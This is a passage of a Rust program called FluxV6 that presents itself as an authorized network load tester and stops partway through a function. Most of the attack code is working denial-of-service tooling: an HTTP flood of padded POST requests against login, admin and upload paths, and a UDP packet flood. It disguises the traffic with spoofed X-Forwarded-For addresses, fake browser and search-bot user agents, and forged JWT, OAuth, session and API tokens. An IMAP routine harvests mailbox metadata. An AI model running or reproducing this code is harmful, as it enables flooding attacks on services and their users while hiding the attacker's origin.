
//
// WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY
// - Do NOT use for malicious purposes or unauthorized attacks
// - This is NOT malware - it's a legitimate security testing tool
// - Users are responsible for ensuring proper authorization before use
// - Misuse may result in legal consequences
//

use anyhow::Result;
use base64::{engine::general_purpose, Engine as _};
use clap::Parser;
use futures_util::future;
use imap::connect;
use imap::types::Flag;
use lettre::transport::smtp::authentication::Credentials;
use lettre::{Message, SmtpTransport, Transport};
use mailparse::MailHeaderMap;
use rand::Rng;
use reqwest::Client;
use serde_json::json;
use sha2::{Digest, Sha256};
use std::fs;
use std::io::{self, Write};
use std::net::SocketAddr;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::net::UdpSocket;
use tokio::time::{interval, sleep};
use tracing::{error, info, warn};
use uuid::Uuid;

/// Command-line arguments for the load testing tool
#[derive(Parser, Clone)]
#[command(name = "flux_load_tester")]
#[command(about = "Network load testing tool for authorized security testing - FluxV6 Designed By HyperSecurity. Author Khaninkali")]
struct CliArgs {
    /// Target URL to test (e.g., https://example.com)
    #[arg(short, long)]
    target: String,

    /// Number of concurrent simulated users
    #[arg(short, long, default_value = "100")]
    concurrent_users: usize,

    /// Test duration in seconds
    #[arg(short, long, default_value = "900")]
    duration_secs: u64,

    /// Enable realistic browsing patterns
    #[arg(long, default_value = "true")]
    realistic_browsing: bool,

    /// Include mobile device traffic
    #[arg(long, default_value = "true")]
    mobile_traffic: bool,

    /// Include bot/crawler traffic
    #[arg(long, default_value = "true")]
    bot_traffic: bool,

    /// Include API client traffic
    #[arg(long, default_value = "true")]
    api_traffic: bool,

    /// Traffic intensity level: low, medium, high
    #[arg(long, default_value = "medium")]
    intensity: String,

    /// Simulate geographic distribution
    #[arg(long, default_value = "true")]
    geographic_distribution: bool,

    /// Apply time-based traffic patterns
    #[arg(long, default_value = "true")]
    time_patterns: bool,

    /// Enable email protocol testing (SMTP/IMAP)
    #[arg(long, default_value = "false")]
    email_testing: bool,

    /// Email server address (e.g., smtp.gmail.com)
    #[arg(long)]
    email_server: Option<String>,

    /// Email username for authentication
    #[arg(long)]
    email_username: Option<String>,

    /// Email password or app password
    #[arg(long)]
    email_password: Option<String>,

    /// Email port (SMTP: 587, IMAP: 993)
    #[arg(long)]
    email_port: Option<u16>,

    /// Number of emails to send/retrieve for testing
    #[arg(long, default_value = "10")]
    email_count: usize,
}

/// Represents a simulated user with device characteristics and behavior patterns
struct UserProfile {
    user_agent: String,
    device_type: DeviceType,
    #[allow(dead_code)]
    screen_resolution: (u16, u16),
    #[allow(dead_code)]
    timezone: String,
    language: String,
    behavior_pattern: BehaviorPattern,
}

/// Types of devices that can be simulated
#[derive(Clone, Copy, PartialEq, Debug)]
enum DeviceType {
    Desktop,
    Mobile,
    Tablet,
    Bot,
    ApiClient,
}

/// Behavioral patterns for different user types
#[derive(Clone, Copy, PartialEq, Debug)]
enum BehaviorPattern {
    HumanBrowsing,
    BotCrawling,
    ApiAccess,
    MobileApp,
}

/// Comprehensive database of real user agents categorized by device type
const USER_AGENTS: &[(&str, DeviceType)] = &[
    // Desktop browsers - Chrome, Firefox, Safari, Edge
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", DeviceType::Desktop),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", DeviceType::Desktop),
    ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", DeviceType::Desktop),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0", DeviceType::Desktop),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0", DeviceType::Desktop),
    ("Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", DeviceType::Desktop),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15", DeviceType::Desktop),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", DeviceType::Desktop),
    
    // Mobile browsers - Android and iOS
    ("Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", DeviceType::Mobile),
    ("Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36", DeviceType::Mobile),
    ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1", DeviceType::Mobile),
    ("Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1", DeviceType::Tablet),
    
    // Search engine bots and crawlers
    ("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", DeviceType::Bot),
    ("Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", DeviceType::Bot),
    ("Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)", DeviceType::Bot),
    ("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)", DeviceType::Bot),
    
    // API clients and command-line tools
    ("curl/8.5.0", DeviceType::ApiClient),
    ("Wget/1.21.4", DeviceType::ApiClient),
    ("Python-requests/2.31.0", DeviceType::ApiClient),
    ("Go-http-client/2.0", DeviceType::ApiClient),
    ("Java/17.0.2", DeviceType::ApiClient),
];

/// Common screen resolutions mapped to device types
const SCREEN_RESOLUTIONS: &[(DeviceType, &[(u16, u16)])] = &[
    (DeviceType::Desktop, &[(1920, 1080), (1366, 768), (1440, 900), (1536, 864), (2560, 1440), (3840, 2160)]),
    (DeviceType::Mobile, &[(375, 667), (390, 844), (428, 926), (360, 640), (412, 915)]),
    (DeviceType::Tablet, &[(768, 1024), (820, 1180), (1024, 1366)]),
    (DeviceType::Bot, &[(1920, 1080), (1366, 768)]),
    (DeviceType::ApiClient, &[(1920, 1080)]),
];

/// Geographic timezones for distributed traffic simulation
const TIMEZONES: &[&str] = &[
    "America/New_York",
    "America/Los_Angeles",
    "America/Chicago",
    "Europe/London",
    "Europe/Paris",
    "Europe/Berlin",
    "Asia/Tokyo",
    "Asia/Shanghai",
    "Asia/Singapore",
    "Australia/Sydney",
    "America/Sao_Paulo",
    "Africa/Johannesburg",
];

/// Language preferences with quality values
const LANGUAGES: &[&str] = &[
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9",
    "de-DE,de;q=0.9",
    "zh-CN,zh;q=0.9",
    "ja-JP,ja;q=0.9",
    "pt-BR,pt;q=0.9",
    "ru-RU,ru;q=0.9",
    "ko-KR,ko;q=0.9",
    "ar-SA,ar;q=0.9",
    "hi-IN,hi;q=0.9",
];

/// Realistic browsing paths simulating different user journeys
const BROWSING_PATHS: &[&[&str]] = &[
    &["/", "/home", "/about", "/contact", "/products"],
    &["/", "/products", "/products/item1", "/products/item2", "/cart", "/checkout"],
    &["/", "/blog", "/blog/article1", "/blog/article2", "/subscribe"],
    &["/", "/services", "/services/web", "/services/mobile", "/contact"],
    &["/", "/search", "/search?q=admin", "/search?q=login", "/search?q=secret"],
    &["/login", "/dashboard", "/dashboard/profile", "/dashboard/settings", "/logout"],
    &["/", "/gallery", "/gallery/images", "/gallery/videos", "/about"],
    &["/", "/news", "/news/latest", "/news/archives", "/contact"],
];

/// Common API endpoints for testing
const API_ENDPOINTS: &[&str] = &[
    "/api/v1/users",
    "/api/v1/products",
    "/api/v1/orders",
    "/api/v1/status",
    "/api/v2/data",
    "/api/v2/search",
    "/api/v2/upload",
    "/api/v2/download",
    "/graphql",
    "/rest/api",
    "/oauth/token",
    "/webhook",
    "/analytics",
];

/// Email server configurations for common providers
const EMAIL_SERVERS: &[(&str, &str, u16, &str, u16)] = &[
    ("gmail.com", "smtp.gmail.com", 587, "imap.gmail.com", 993),
    ("outlook.com", "smtp-mail.outlook.com", 587, "outlook.office365.com", 993),
    ("yahoo.com", "smtp.mail.yahoo.com", 587, "imap.mail.yahoo.com", 993),
    ("icloud.com", "smtp.mail.me.com", 587, "imap.mail.me.com", 993),
];

/// Email testing results
#[derive(Debug, Clone)]
struct EmailTestResult {
    emails_sent: usize,
    emails_retrieved: usize,
    total_size_bytes: usize,
    average_response_time_ms: f64,
    errors: Vec<String>,
    extracted_info: Vec<EmailInfo>,
}

/// Extracted email information
#[derive(Debug, Clone)]
struct EmailInfo {
    from: String,
    subject: String,
    date: String,
    size_bytes: usize,
    has_attachments: bool,
    is_unread: bool,
}

/// Creates a user profile with realistic device characteristics
///
/// Selects appropriate user agent, screen resolution, timezone, and language
/// based on the specified device type to simulate authentic traffic patterns.
fn create_user_profile(device_type: DeviceType) -> UserProfile {
       let mut rng = rand::thread_rng();

    // Filter user agents matching the requested device type
    let matching_agents: Vec<_> = USER_AGENTS
        .iter()
        .filter(|(_, dev_type)| *dev_type == device_type)
        .collect();

    // Select user agent, fallback to desktop if no matches found
    let (user_agent_str, actual_device_type) = if matching_agents.is_empty() {
        let fallback = USER_AGENTS[rng.gen_range(0..USER_AGENTS.len())];
           (fallback.0.to_string(), DeviceType::Desktop)
    } else {
        let selected = matching_agents[rng.gen_range(0..matching_agents.len())];
           (selected.0.to_string(), selected.1)
    };

    // Get appropriate screen resolution for the device type
    let available_resolutions = SCREEN_RESOLUTIONS
        .iter()
        .find(|(dev, _)| *dev == actual_device_type)
        .map(|(_, resolutions)| *resolutions)
        .unwrap_or(&[(1920, 1080)]);

    let screen_resolution = available_resolutions[rng.gen_range(0..available_resolutions.len())];

    // Randomly select timezone and language for geographic diversity
    let timezone = TIMEZONES[rng.gen_range(0..TIMEZONES.len())].to_string();
      let language = LANGUAGES[rng.gen_range(0..LANGUAGES.len())].to_string();

    // Map device type to behavior pattern
    let behavior_pattern = match actual_device_type {
        DeviceType::Bot => BehaviorPattern::BotCrawling,
        DeviceType::ApiClient => BehaviorPattern::ApiAccess,
        DeviceType::Mobile => BehaviorPattern::MobileApp,
        _ => BehaviorPattern::HumanBrowsing,
    };

    UserProfile {
        user_agent: user_agent_str,
        device_type: actual_device_type,
        screen_resolution,
        timezone,
        language,
        behavior_pattern,
    }
}

/// Generates realistic HTTP headers based on user profile
///
/// Creates headers that match the device type and include geographic information,
/// browser capabilities, and behavioral characteristics to appear authentic.
fn build_request_headers(profile: &UserProfile) -> reqwest::header::HeaderMap {
    let mut headers = reqwest::header::HeaderMap::new();
    let mut rng = rand::thread_rng();

    // Core headers present in all requests
    headers.insert(
        reqwest::header::USER_AGENT,
        profile.user_agent.parse().unwrap(),
    );

    headers.insert(
        reqwest::header::ACCEPT_LANGUAGE,
        profile.language.parse().unwrap(),
    );

    headers.insert(
        reqwest::header::ACCEPT_ENCODING,
        "gzip, deflate, br".parse().unwrap(),
    );

    // Device-specific client hints for modern browsers
    match profile.device_type {
        DeviceType::Mobile => {
            headers.insert("Sec-CH-UA-Mobile", "?1".parse().unwrap());
               headers.insert("Sec-CH-UA-Platform", "\"Android\"".parse().unwrap());
        }
        DeviceType::Tablet => {
            headers.insert("Sec-CH-UA-Mobile", "?1".parse().unwrap());
               headers.insert("Sec-CH-UA-Platform", "\"iOS\"".parse().unwrap());
        }
        DeviceType::Desktop => {
            headers.insert("Sec-CH-UA-Mobile", "?0".parse().unwrap());
               headers.insert("Sec-CH-UA-Platform", "\"Windows\"".parse().unwrap());
        }
        _ => {}
    }

    // Privacy-conscious users sometimes send Do Not Track
    if rng.gen_bool(0.3) {
        headers.insert("DNT", "1".parse().unwrap());
    }

    // Cache control for fresh content requests
    if rng.gen_bool(0.5) {
        headers.insert(
            reqwest::header::CACHE_CONTROL,
            "max-age=0".parse().unwrap(),
        );
    }

    // Simulate requests from different IP addresses for geographic distribution
    headers.insert(
        "X-Forwarded-For",
        format!(
            "{}.{}.{}.{}",
            rng.gen_range(1..255),
            rng.gen_range(0..256),
            rng.gen_range(0..256),
        rng.gen_range(1..255)
        )
        .parse()
        .unwrap(),
    );

    headers
}

/// Generates authentication tokens based on target domain characteristics
///
/// Analyzes the target URL to determine the appropriate authentication strategy
/// (JWT, OAuth2, session tokens, or API keys) and generates a realistic token.
async fn generate_auth_token(target_url: &str) -> Result<String> {
    let _client = Client::builder()
        .timeout(Duration::from_secs(10))
        .build()?;

    // Extract domain from URL for token generation strategy
    let domain = match target_url.split("://").nth(1) {
           Some(domain_part) => domain_part.split('/').next().unwrap_or(target_url),
        None => target_url,
    };

    // Select authentication strategy based on domain characteristics
    let token = match domain {
          d if d.contains("api.") || d.contains("rest.") => {
            // REST APIs typically use JWT tokens
            create_jwt_token(domain).await?
        }
          d if d.contains("auth.") || d.contains("login.") => {
            // Authentication services use OAuth2
            create_oauth2_token(domain).await?
        }
          d if d.contains("admin.") || d.contains("dashboard.") => {
            // Admin panels use session-based authentication
            create_session_token(domain).await?
        }
        _ => {
            // Generic endpoints use API keys
            create_api_key(domain).await?
        }
    };

    info!(
        "Generated {} token for domain: {}",
        determine_token_type(domain),
        domain
    );

    Ok(token)
}

/// Creates a JWT (JSON Web Token) for API authentication
///
/// Generates a properly formatted JWT with header, payload, and signature
/// following the standard JWT structure used by REST APIs.
async fn create_jwt_token(domain: &str) -> Result<String> {
    let current_timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)?
        .as_secs();

    // JWT header specifying algorithm and token type
    let header = json!({
        "alg": "HS256",
        "typ": "JWT"
    });

    // JWT payload with standard claims
    let payload = json!({
        "iss": format!("https://{}", domain),
        "sub": Uuid::new_v4().to_string(),
        "aud": domain,
        "exp": current_timestamp + 3600, // Token expires in 1 hour
        "iat": current_timestamp,
        "jti": Uuid::new_v4().to_string(),
          "scope": "read write admin",
        "roles": ["user", "api_access"]
    });

    // Base64-encode header and payload
    let encoded_header =
          general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_string(&header)?);
    let encoded_payload =
          general_purpose::URL_SAFE_NO_PAD.encode(serde_json::to_string(&payload)?);

    // Generate HMAC-SHA256 signature
    let signing_input = format!("{}.{}", encoded_header, encoded_payload);
        let signature = compute_hmac_sha256(&signing_input, domain);

    Ok(format!("{}.{}.{}", encoded_header, encoded_payload, signature))
}

/// Creates an OAuth2 access token for authentication services
///
/// Generates a Bearer token with associated metadata following OAuth2 standards,
/// including access token, refresh token, and scope information.
async fn create_oauth2_token(domain: &str) -> Result<String> {
    let current_timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)?
          .as_secs();

    // OAuth2 token metadata (not included in final token but used for generation)
    let _token_metadata = json!({
        "access_token": Uuid::new_v4().to_string(),
           "token_type": "Bearer",
        "expires_in": 3600,
        "refresh_token": Uuid::new_v4().to_string(),
            "scope": "profile email read write",
    "client_id": format!("flux_load_tester_{}", domain),
           "user_id": Uuid::new_v4().to_string(),
        "issued_at": current_timestamp
    });

    // Create OAuth2-style Bearer token
    let token = format!(
        "oauth2_{}_{}", 
        general_purpose::STANDARD.encode(domain.as_bytes()),
        Uuid::new_v4().to_string()
    );

    Ok(token)
}

/// Creates a session token for web application authentication
///
/// Generates a session-based authentication token with associated metadata
/// including session ID, expiration, and CSRF protection.
async fn create_session_token(domain: &str) -> Result<String> {
    let session_id = Uuid::new_v4().to_string();
       let current_timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)?
          .as_secs();

    // Session metadata (used for token generation)
    let _session_metadata = json!({
          "session_id": session_id,
          "domain": domain,
          "created_at": current_timestamp,
        "expires_at": current_timestamp + 7200, // 2 hour session
        "user_agent": "flux_load_tester",
           "ip_address": format!(
            "{}.{}.{}.{}",
              rand::thread_rng().gen_range(1..255),
               rand::thread_rng().gen_range(0..256),
               rand::thread_rng().gen_range(0..256),
              rand::thread_rng().gen_range(1..255)
        ) ,
        "csrf_token": Uuid::new_v4().to_string()
    });

    // Generate session token with domain and timestamp
    let token = format!(
        "sess_{}_{}", 
        general_purpose::STANDARD.encode(format!("{}:{}", domain, session_id).as_bytes()),
        current_timestamp
    );

    Ok(token)
}

/// Creates an API key for service-to-service authentication
///
/// Generates an API key with embedded signature for verification,
/// commonly used for programmatic access to services.
async fn create_api_key(domain: &str) -> Result<String> {
    let key_id = format!("ak_{}", Uuid::new_v4().to_string()[..8].to_uppercase());
    let secret = Uuid::new_v4().to_string();

    let current_timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)?
        .as_secs();

    // Create signed message for API key verification
    let message = format!("{}:{}:{}", domain, key_id, current_timestamp);
    let signature = compute_hmac_sha256(&message, &secret);

    let api_key = format!("{}_{}_{}", key_id, secret, signature);

    Ok(api_key)
}

/// Computes HMAC-SHA256 signature for token signing
///
/// Uses SHA256 hashing with a secret key to create a signature
/// that can be used to verify token authenticity.
fn compute_hmac_sha256(message: &str, secret: &str) -> String {
    use std::fmt::Write;
    
    let mut hasher = Sha256::new();
    hasher.update(format!("{}{}", secret, message).as_bytes());
    let hash_result = hasher.finalize();

    // Convert hash bytes to hexadecimal string
    let mut hex_string = String::with_capacity(64);
    for byte in hash_result {
        write!(&mut hex_string, "{:02x}", byte).unwrap();
    }
    hex_string
}

/// Determines the token type based on domain characteristics
fn determine_token_type(domain: &str) -> &'static str {
    if domain.contains("api.") || domain.contains("rest.") {
        "JWT"
    } else if domain.contains("auth.") || domain.contains("login.") {
        "OAuth2"
    } else if domain.contains("admin.") || domain.contains("dashboard.") {
        "Session"
    } else {
        "API Key"
    }
}

/// Executes high-intensity HTTP flood attack on target
///
/// Sends rapid HTTP requests to multiple endpoints to test server capacity
/// under extreme load conditions. Duration and intensity are configurable.
async fn execute_http_flood(target_url: &str, intensity_level: &str) -> Result<usize> {
    let client = Client::builder()
        .timeout(Duration::from_secs(5))
         .build()?;

    let mut total_requests = 0;
    let start_time = std::time::Instant::now();
    
    // Determine attack duration based on intensity
    let duration_secs = match intensity_level {
        "high" => 300, // 5 minutes for high intensity
        _ => 180,      // 3 minutes for medium/low
    };

    // Common endpoints to target during load testing
    let test_endpoints = ["/", "/api/v1/data", "/admin", "/login", "/search", "/upload"];

    while start_time.elapsed().as_secs() < duration_secs {
        for endpoint in &test_endpoints {
               let full_url = format!("{}{}", target_url.trim_end_matches('/'), endpoint);

            // Launch concurrent requests for maximum throughput
            let request_handles: Vec<_> = (0..10)
                .map(|_| {
                    let client_clone = client.clone();
                    let url_clone = full_url.clone();
                    tokio::spawn(async move {
                        let payload = create_load_test_payload();
                        let _ = client_clone
                            .post(&url_clone)
                            .header("Content-Type", "application/json")
                            .body(payload)
                            .send()
                             .await;
                    })
                })
                .collect();

            future::join_all(request_handles).await;
            total_requests += 10;
        }

        // Minimal delay to maintain high request rate
        tokio::time::sleep(Duration::from_millis(10)).await;
    }

    Ok(total_requests)
}

/// Creates a payload for load testing requests
///
/// Generates JSON payloads of varying sizes to simulate realistic
/// data transmission during load tests.
fn create_load_test_payload() -> String {
    let mut rng = rand::thread_rng();
        let payload_size = rng.gen_range(1024..8192); // 1KB to 8KB

    json!({
        "data": "A".repeat(payload_size),
        "timestamp": std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs(),
        "request_id": Uuid::new_v4().to_string(),
        "test_type": "load_test"
    })
    .to_string()
}

/// Executes UDP packet flood for network stress testing
///
/// Sends high-volume UDP packets to test network infrastructure
/// and bandwidth capacity under load.
async fn execute_udp_flood(target_addr_str: &str) -> Result<usize> {
    let mut packets_sent = 0;

    // Bind to any available local port for sending
    if let Ok(socket) = UdpSocket::bind("0.0.0.0:0").await {
        // Parse target address, fallback to localhost if parsing fails
           let target_addr = if let Ok(parsed_addr) = target_addr_str.parse::<SocketAddr>() {
              parsed_addr
        } else {
            "127.0.0.1:80".parse().unwrap()
        };

        let start_time = std::time::Instant::now();
        let test_duration_secs = 180; // 3 minutes

        while start_time.elapsed().as_secs() < test_duration_secs {
            let payload = create_udp_test_payload();
            if socket.send_to(&payload, &target_addr).await.is_ok() {
                packets_sent += 1;
            }
            // Small delay between packets to avoid overwhelming local network
            tokio::time::sleep(Duration::from_micros(100)).await;
        }
    }

    Ok(packets_sent)
}

/// Creates a UDP packet payload for network testing
///
/// Generates random data of typical UDP packet sizes for realistic
/// network load simulation.
fn create_udp_test_payload() -> Vec<u8> {
    let mut rng = rand::thread_rng();
       let packet_size = rng.gen_range(512..1472); // Standard UDP payload range
      (0..packet_size).map(|_| rng.gen::<u8>()).collect()
}

/// Tests SMTP connectivity and email sending capabilities
async fn test_smtp_connection(
    server: &str,
    _port: u16,
    username: &str,
    password: &str,
    email_count: usize,
) -> Result<(usize, Vec<String>)> {
    let mut sent_count = 0;
    let mut errors = Vec::new();

        let creds = Credentials::new(username.to_string(), password.to_string());
    
    for i in 0..email_count {
        let start_time = std::time::Instant::now();
        
        // Create test email
        let email_result = Message::builder()
            .from(username.parse().unwrap())
            .to(username.parse().unwrap())
            .subject(format!("Test Email {} - FluxV6 Load Test", i + 1))
            .body(format!(
                "This is test email number {} sent by FluxV6 load testing tool.\n\nTimestamp: {}\nTest ID: {}",
                i + 1,
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs(),
                Uuid::new_v4()
            ));

        match email_result {
            Ok(email) => {
                // Create SMTP transport
                let mailer = SmtpTransport::relay(server)
                    .unwrap()
                    .credentials(creds.clone())
                    .build();

                match mailer.send(&email) {
                    Ok(_) => {
                        sent_count += 1;
                        info!("SMTP email {} sent successfully", i + 1);
                    }
                    Err(e) => {
                        errors.push(format!("Failed to send email {}: {}", i + 1, e));
                        warn!("SMTP send error: {}", e);
                    }
                }
            }
            Err(e) => {
                errors.push(format!("Failed to build email {}: {}", i + 1, e));
            }
        }

        let elapsed = start_time.elapsed();
        info!("SMTP email {} completed in {:?}", i + 1, elapsed);
        
        // Small delay between emails to avoid rate limiting
        tokio::time::sleep(Duration::from_millis(100)).await;
    }

    Ok((sent_count, errors))
}

/// Tests IMAP connectivity and email retrieval capabilities
async fn test_imap_connection(
    server: &str,
    _port: u16,
    username: &str,
    password: &str,
    email_count: usize,
) -> Result<(usize, Vec<EmailInfo>, Vec<String>)> {
    let mut retrieved_count = 0;
    let mut email_info = Vec::new();
    let mut errors = Vec::new();

    // Clone strings to move into spawn_blocking
    let server_owned = server.to_string();
       let username_owned = username.to_string();
       let password_owned = password.to_string();

    // Use tokio::task to run blocking IMAP operations
    let result = tokio::task::spawn_blocking(move || {
        // Connect to IMAP server using imap's connect function
        let ssl = native_tls::TlsConnector::new()?;
        let client = connect((server_owned.as_str(), 993), server_owned.as_str(), &ssl)?;
        let mut session = match client.login(&username_owned, &password_owned) {
            Ok(session) => session,
              Err((e, _)) => {
                return Ok((0, Vec::new(), vec![format!("IMAP login failed: {}", e)]));
            }
        };

        // Select INBOX
        let mailbox = match session.select("INBOX") {
            Ok(mailbox) => mailbox,
            Err(e) => {
                return Ok((0, Vec::new(), vec![format!("Failed to select INBOX: {}", e)]));
            }
        };

        let exists = mailbox.exists;
        let fetch_limit = std::cmp::min(email_count, exists as usize);
        
        if fetch_limit > 0 {
            let seq_set = format!("{}:{}", exists - fetch_limit as u32 + 1, exists);
            
              match session.fetch(seq_set, "(RFC822 FLAGS)") {
                Ok(messages) => {
                    for msg in messages.iter().take(fetch_limit) {
                        if let Some(body) = msg.body() {
                            match mailparse::parse_mail(body) {
                                Ok(parsed_mail) => {
                                    let headers = parsed_mail.get_headers();
                                    let from = headers.get_first_value("From").unwrap_or_else(|| "Unknown".to_string());
                                    let subject = headers.get_first_value("Subject").unwrap_or_else(|| "No Subject".to_string());
                                      let date = headers.get_first_value("Date").unwrap_or_else(|| "Unknown".to_string());
                                    
                                    // Check if unread
                                    let is_unread = msg.flags().contains(&Flag::Seen) == false;
                                    
                                    // Check for attachments (simplified)
                                    let has_attachments = parsed_mail.subparts.len() > 1 || 
                                        parsed_mail.get_headers().get_first_value("Content-Type")
                                            .unwrap_or_default()
                                            .contains("attachment");

                                    email_info.push(EmailInfo {
                                        from,
                                        subject,
                                          date,
                                        size_bytes: body.len(),
                                        has_attachments,
                                        is_unread,
                                    });
                                    
                                    retrieved_count += 1;
                                }
                                Err(e) => {
                                    errors.push(format!("Failed to parse email: {}", e));
                                }
                            }
                        }
                    }
                }
                Err(e) => {
                    errors.push(format!("Failed to fetch emails: {}", e));
                }
            }
        }

        // Logout
        let _ = session.logout();
        Ok((retrieved_count, email_info, errors))
    }).await?;

    result
}

/// Auto-detects email server configuration based on email domain
fn detect_email_server(email: &str) -> Option<(&str, u16, &str, u16)> {
    if let Some(domain) = email.split('@').nth(1) {
        for (provider_domain, smtp_server, smtp_port, imap_server, imap_port) in EMAIL_SERVERS {
            if domain == *provider_domain {
                return Some((smtp_server, *smtp_port, imap_server, *imap_port));
            }
        }
    }
    None
}

/// Main email testing orchestration function
async fn run_email_test(args: &CliArgs) -> Result<EmailTestResult> {
    let mut result = EmailTestResult {
        emails_sent: 0,
        emails_retrieved: 0,
        total_size_bytes: 0,
        average_response_time_ms: 0.0,
        errors: Vec::new(),
        extracted_info: Vec::new(),
    };

       let username = args.email_username.as_ref().ok_or_else(|| anyhow::anyhow!("Email username required"))?;
       let password = args.email_password.as_ref().ok_or_else(|| anyhow::anyhow!("Email password required"))?;

    // Auto-detect servers if not provided
    let (smtp_server, smtp_port, imap_server, imap_port) = if let (Some(server), Some(port)) = (&args.email_server, args.email_port) {
        (server.as_str(), port, server.as_str(), port)
    } else {
        detect_email_server(username)
            .ok_or_else(|| anyhow::anyhow!("Could not detect email server configuration. Please provide --email-server and --email-port"))?
    };

    info!("Starting email test with SMTP: {}:{}", smtp_server, smtp_port);
    info!("IMAP server: {}:{}", imap_server, imap_port);

       let start_time = std::time::Instant::now();

    // Test SMTP (sending)
    match test_smtp_connection(smtp_server, smtp_port, username, password, args.email_count).await {
        Ok((sent, mut smtp_errors)) => {
            result.emails_sent = sent;
              result.errors.append(&mut smtp_errors);
        }
        Err(e) => {
            result.errors.push(format!("SMTP test failed: {}", e));
        }
    }

    // Test IMAP (retrieving)
    match test_imap_connection(imap_server, imap_port, username, password, args.email_count).await {
        Ok((retrieved, info, mut imap_errors)) => {
            result.emails_retrieved = retrieved;
              result.extracted_info = info;
                result.errors.append(&mut imap_errors);

            // Calculate total size
            result.total_size_bytes = result.extracted_info.iter().map(|e| e.size_bytes).sum();
        }
        Err(e) => {
             result.errors.push(format!("IMAP test failed: {}", e));
        }
    }

    let elapsed = start_time.elapsed();
        result.average_response_time_ms = elapsed.as_millis() as f64 / (args.email_count as f64);

    Ok(result)
}

/// Simulates realistic user behavior based on profile and intensity settings
///
/// Executes HTTP requests matching the user's device type and behavior pattern.
/// In high-intensity mode, increases request frequency for load testing.
async fn simulate_user_session(
    profile: UserProfile,
    target_url: &str,
       duration_secs: u64,
    intensity_level: &str,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let client = Client::builder()
          .user_agent(&profile.user_agent)
        .timeout(Duration::from_secs(30))
           .build()?;

    let start_time = std::time::Instant::now();
    let mut request_count = 0;
    let is_high_intensity = intensity_level == "high";

    // Adjust request frequency based on intensity level
    let request_interval = match intensity_level {
        "low" => Duration::from_secs(30),
        "high" => Duration::from_millis(500), // Rapid requests for load testing
        _ => Duration::from_secs(15),
    };

    let mut tick_interval = interval(request_interval);
    let total_requests = Arc::new(AtomicUsize::new(0));

    info!(
        "User session started - Device: {:?}, Pattern: {:?}, High Intensity: {}",
        profile.device_type, profile.behavior_pattern, is_high_intensity
    );

    while start_time.elapsed().as_secs() < duration_secs {
        tokio::select! {
            _ = sleep(Duration::from_secs(duration_secs)) => {
                break;
            }
            _ = tick_interval.tick() => {
                let headers = build_request_headers(&profile);

                match profile.behavior_pattern {
                    BehaviorPattern::HumanBrowsing => {
                        if is_high_intensity {
                            // High-intensity mode: send multiple concurrent requests
                            let request_handles: Vec<_> = (0..20)
                                .map(|_| {
                                    let client_clone = client.clone();
                                    let target_clone = target_url.to_string();
                                    let headers_clone = headers.clone();
                                    tokio::spawn(async move {
                                        let endpoints = ["/", "/api", "/admin", "/login"];
                                        let endpoint = endpoints[rand::random::<usize>() % endpoints.len()];
                                        let url = format!("{}{}", target_clone.trim_end_matches('/'), endpoint);
                                        let payload = create_load_test_payload();
                                        let _ = client_clone
                                            .post(&url)
                                            .headers(headers_clone)
                                            .header("Content-Type", "application/json")
                                            .body(payload)
                                            .send()
                                            .await;
                                    })
                                })
                                .collect();

                            future::join_all(request_handles).await;
                            request_count += 20;
                        } else {
                            // Normal browsing: follow realistic navigation paths
                            let browsing_path = BROWSING_PATHS[rand::random::<usize>() % BROWSING_PATHS.len()];
                            for page in browsing_path {
                                if start_time.elapsed().as_secs() >= duration_secs {
                                    break;
                                }

                                let url = format!("{}{}", target_url.trim_end_matches('/'), page);
                                let _response = client.get(&url).headers(headers.clone()).send().await?;

                                request_count += 1;

                                // Simulate time spent reading page content
                                let reading_time = Duration::from_millis(rand::random::<u64>() % 10000 + 1000);
                                tokio::time::sleep(reading_time).await;
                            }
                        }
                    }
                    BehaviorPattern::BotCrawling => {
